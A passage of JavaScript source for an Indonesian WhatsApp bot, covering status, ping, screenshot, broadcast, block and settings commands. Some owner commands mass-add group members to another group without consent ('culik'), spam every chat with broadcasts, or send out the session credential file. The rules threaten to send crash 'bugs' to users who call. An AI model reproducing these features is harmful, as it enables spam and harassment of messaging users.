let osu = require('node-os-utils')
try {
let NotDetect = 'Not Detect'
let old = performance.now()
let cpu = osu.cpu
let cpuCore = cpu.count()
let drive = osu.drive
let mem = osu.mem
let netstat = osu.netstat
let OS = osu.os.platform()
let cpuModel = cpu.model()
let cpuPer
let p1 = cpu.usage().then(cpuPercentage => {
var cpuPer = cpuPercentage
}).catch(() => {
var cpuPer = NotDetect
})
let driveTotal, driveUsed, drivePer
let p2 = drive.info().then(info => {
driveTotal = (info.totalGb + ' GB'),
driveUsed = info.usedGb,
drivePer = (info.usedPercentage + '%')
}).catch(() => {
driveTotal = NotDetect,
driveUsed = NotDetect,
drivePer = NotDetect
})
let ramTotal, ramUsed
let p3 = mem.info().then(info => {
ramTotal = info.totalMemMb,
ramUsed = info.usedMemMb
}).catch(() => {
ramTotal = NotDetect,
ramUsed = NotDetect
})
let netsIn, netsOut
let p4 = netstat.inOut().then(info => {
netsIn = (info.total.inputMb + ' MB'),
netsOut = (info.total.outputMb + ' MB')
}).catch(() => {
netsIn = NotDetect,
netsOut = NotDetect
})
await Promise.all([p1, p2, p3, p4])
await setReply(`_Testing ${command }..._`)
let _ramTotal = (ramTotal + ' MB')
let neww = performance.now()
let teks =`
*「 Status 」*

OS : *${OS}*
CPU Model : *${cpuModel}*
CPU Core : *${cpuCore} Core*
CPU : *${cpuPer? `${cpuPer}%`:"Not Found"}*
Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) &&  /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
Ping : *${Math.round(neww - old)} ms*
Internet IN : *${netsIn}*
Internet OUT : *${netsOut}*
`
let mok = [
{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
xdev.sendButLoc(from, teks,fake,zreply, mok)
} catch (err) {
setReply(err)
}
} 
break
case 'del':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (mentionByReply == botNumber) {
xdev.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
} else  {
setReply("Reply pesan bot nya")
}
break
case 'ping': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
setReply(respon)
}
break
case 'runtime':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
break
case 'speed':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break
case 'ss':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply("Masukan Link")
if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Link error");
if (args.length < 1) return setReply('Urlnya mana om')
let teks = q
let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
let buff = await getBuffer(ana.screenshot)
await xdev.sendMessage(from, {caption : `Link: ${teks}`, image: buff}, {quoted: setQuoted})
}
break
case 'readmore':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return setReply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
setReply(`${text1}${readmore}${text2}`)
}
break
case 'infobotz':{ 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()       
var groups = totalchat.filter(v => v.endsWith('g.us'))
var privat = totalchat.filter(v => v.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
var ram3 =`${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
let uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
var wa_version = xdev.waVersion
var mcc = "Error"
var mnc = "Error"
var os_version = "Error"
var device_manufacturer = "Error"
var device_model = "Error"
let gender ="Female"
let nomerOwner =`Ownerin.split("@")[0]`
let menunya =`
「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」

*▸* Nama : ${botName}
*▸* Gender : ${gender}
*▸* Private Chat : ${privat.length}
*▸* Group Chat : ${groups.length}
*▸* Total Chat : ${totalchat.length}
*▸* Speed : ${latensi.toFixed(4)} second
*▸* Penggunaan Ram : ${ram2}
*▸* Hostname : ${os.hostname()}
*▸* Platform : ${os.platform()}
*▸* Device Model: ${device_model}
*▸* Device Manufactur : ${device_manufacturer}
*▸* Wa Version: ${wa_version}
*▸* Os Version: ${os_version}
*▸* Owner : ${nomerOwner}
*▸* Tgl pembuatan : 25 Juli 2021
*▸* Tgl release : 29 September 2021
*▸* Tgl sekarang : ${calender}
*▸* Image : Girl Front Line G11
*▸* Voice : Nina kawai

*▸* SCRIPT BY
   Decode Denpa
   X-Dev Team
   Yogi PW
   Hexagon
   Dttaz

*▸* FEATURE  BY  
   Decode Denpa
   Fernazer
   X-Dev Team
   Resta Gamteng
   Zeeone Ofc
   X-Dev Team
   Yudha perdana
   Xchilds
   Dika Ardnt
`
let info = ofrply
let options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",infringementnail: ofrply, mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
let gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
xdev.sendButImage(from, menunya, fake, ofrply, gbutsan)      
} 
break
case 'rules':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks =`
Syarat dan Ketentuan menggunakan *${botName}*

1. Nama dan nomer user ${botName}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${botName}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`

let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]                   
xdev.sendButImage(from, teks, fake, ofrply, mok, {quoted: setQuoted})             
}
break  
case 'kalkulator':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const matematik = require('mathjs')
try{
let nana = q.replace("x","*")
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break
case 'react': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply(`Contoh ${prefix+command} 😝`)
let reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: true, id: quoted.id }
}
}
xdev.sendMessage(from, reactionMessage)
}
break
case 'listgc': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let getGroups = await xdev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await xdev.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
xdev.sendTextWithMentions(from, teks, setQuoted)
}
break
case 'listpc': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
xdev.sendTextWithMentions(from, teks, setQuoted)
}
break       
//━━━━━━━━━━━━━━━[ OWNER ]━━━━━━━━━━━━━━━━━//
case 'join':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Kirim perintah ${command} _linkgrup_`)
var url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await xdev.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break
case 'bc': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (args.length < 2) return setReply(`Masukkan isi pesannya`)
var data = await store.chats.all()
for (let i of data) {
await xdev.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
await sleep(1000)
}
break
case 'bcgc':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply('Teksnya?')
const delay = time => new Promise(res => setTimeout(res, time))
let getGroups = await xdev.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if (!q) return setReply('teksnya?')
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [
{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
{"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) { //Image
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await delay(1000)
await xdev.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, jpegThumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await xdev.sendMessage(i, {caption: teks, video: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await xdev.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await xdev.sendMessage(i, {caption: teks, audio: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
await delay(1000)
await xdev.sendButLoc(i, teks,fake,zreply, yesnih)
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'getcaze':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply("*Mau nyari Case apa kak*") 
let nana = await getCase(q)
setReply(nana)
break
case 'getsesi':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
await setReply(`Getting File`)
let sesi = await fs.readFileSync(`./ACTION/CONNECTION/${sessionName}.json`)
await xdev.sendMessage(from, { document: sesi, mimetype: 'application/json', fileName: `${sessionName}.json` }, { quoted: setQuoted })
}
break
case 'out': case 'leave':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isOwner) return onlyOwner()
await xdev.groupLeave(from)
break
case 'block':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (isGroup){
if (users){
await xdev.updateBlockStatus(users, "block")
setReply(`Sukses block user`)
} else {
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
await xdev.updateBlockStatus(woke, "block")
} else if(!q){
setReply("Masukan nomer yang ingin di block")
}
}
setReply(`Berhasil Block user ${woke.split("@")[0]}`)
break
case 'unblock':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if(isGroup){
if(users){
await xdev.updateBlockStatus(users, "unblock")
await setReply(`Sukses unblock user`)
} else if(!q){
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
await xdev.updateBlockStatus(woke, "unblock")
} else if(!q){
setReply("Masukan nomer yang ingin di unblock")
}
}
break
case 'blockcmd':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break
case 'unblockcmd':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply("Textnya mana cih")
if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break             
case 'chat': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
xdev.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unmute') {
xdev.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'archive') {
xdev.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
xdev.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'read') {
xdev.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unread') {
xdev.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'delete') {
xdev.chatModify({ clear: { message: { id: dev.quoted.id, fromMe: true }} }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
var org = q.split("|")[1];
xdev.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
}
}
break
case 'autolevel':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoLevel) return setReply('Sudah aktif kak')
autoLevel = true
setReply("Sukses mengaktifkan auto level!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!autoLevel) return setReply('Sudah Mati')
autoLevel = false
setReply("Sukses mematikan auto level!");
} else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}],setQuoted);
}
}
break;
case 'autorespon':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autorespon === true) return setReply('Udah aktif kak')
autorespon = true
let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autorespon === false) return setReply('Udah off kak')
autorespon = false
let eh =`Mode auto respon telah di matikan`
setReply(eh) 
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
}
break;
case 'autosticker':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoSticker === true) return setReply('Udah aktif kak')
autoSticker = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autoSticker === false) return setReply('Udah off kak')
autoSticker = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
}
break;
case 'autovn':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autovn === true) return setReply('Udah aktif kak')
autovn = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autovn === false) return setReply('Udah off kak')
autovn = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
}
break
case 'orquoted':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'true' ) {
if (orquoted === false) return setReply('Udah aktif kak')
orquoted = false
let ih =`Mode ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'false' ) {
if (orquoted === true) return setReply('Udah off kak')
orquoted = true
let eh =`Mode ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}orquoted true`, buttonText: { displayText: 'true' },type: 1},
{buttonId: `${prefix}orquoted false`, buttonText: { displayText: 'false' },type: 1}]);
}
break
case 'autobutton':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autobutton === true) return setReply('Udah aktif kak')
autobutton = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autobutton === false) return setReply('Udah off kak')
autobutton = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autobutton on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autobutton off`, buttonText: { displayText: Off },type: 1}]);
}
break
case 'addlimit': 
case 'giftlimit': 
case 'givelimit': 
case 'kasihlimit':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)      
if (mentionByReply) {
tambahLimit(mentionByReply, parseInt(args[0]))         
setReply(`Berhasil Add limit : ${args[0]}\nNo : ${mentionByReply.split("@")[0]}`)
} else if(mentionByTag && isGroup) { 
tambahLimit(mentionByTag[0], parseInt(args[1]))         
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${mentionByTag[0].split("@")[0]}`)
} else if(!isGroup){
tambahLimit(`${args[0]}@s.whatsapp.net`, parseInt(args[1]))
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${args[0]}️`)
} else setReply("Tag atau Reply usernya")
break
case 'culik':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (args.length < 1) return setReply('_*Masukin id grupnya tolol*_')
let pantek = []
for (let i of groupMembers) {
console.log(i.id)
await pantek.push(i.id)
}
await xdev.groupParticipantsUpdate(q, pantek, 'add')
break	
case 'shutdown':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
await setReply('Okey')
return await xdev.sendMessage(from, JSON.stringify(eval(process.exit())))
break
case 'restart':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
await setReply(`_Restarting ${botName}_`)
exec(`cd && node index`)
await sleep(4000)
setReply('Sukses')
break
//━━━━━━━━━━━━━━━[ SETTING BOT ]━━━━━━━━━━━━━━━━━//
case 'console':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (Console === true) return setReply('Udah aktif kak')
Console = true
let ih =`Tampilan console telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
 if (Console === false) return setReply('Udah off kak')
Console = false
let eh =`Mode auto respon telah di matikan`
setReply(eh)
}else if (!q) {
xdev.sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}console on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}console off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'public':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break           
case 'self':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!publik) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break
case 'setmenu':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
setmenu = "location2"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
setmenu = "image"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'lokasi' ){
setmenu = "location"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'katalog' ){
setmenu = "katalog"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
setmenu = "image2"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'document'){
setmenu = "document"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'gif'){
setmenu = "gif"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
